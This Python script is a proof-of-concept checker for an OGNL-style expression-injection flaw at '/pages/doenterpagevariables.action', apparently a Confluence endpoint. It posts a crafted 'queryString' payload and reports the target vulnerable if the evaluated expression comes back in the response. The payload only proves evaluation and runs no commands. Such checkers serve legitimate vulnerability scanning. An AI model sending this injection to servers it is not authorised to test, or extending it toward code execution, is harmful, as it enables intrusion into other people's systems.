# -*- coding: utf-8 -*-
# Author: key
# Team: OverSpace

import requests, sys

def PoCTest(url):
	paramsPost = {"queryString":"aaa\\u0027+\x23{\\u0022\\u0022[\\u0022class\\u0022]}+\\u0027bbb"}
	headers = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0","Content-Type":"application/x-www-form-urlencoded"}
	response = requests.post(url, data=paramsPost, headers=headers)
	if "aaa{class java.lang.String=null}bbb" in response.text:
		return True
	else:
		return False

if __name__ == '__main__':
	url = sys.argv[1] + "/pages/doenterpagevariables.action"
	pocResult = PoCTest(url)
	if pocResult:
		print("Vulnerability: {0}".format(url))
	else:
		print("No Vulnerability.")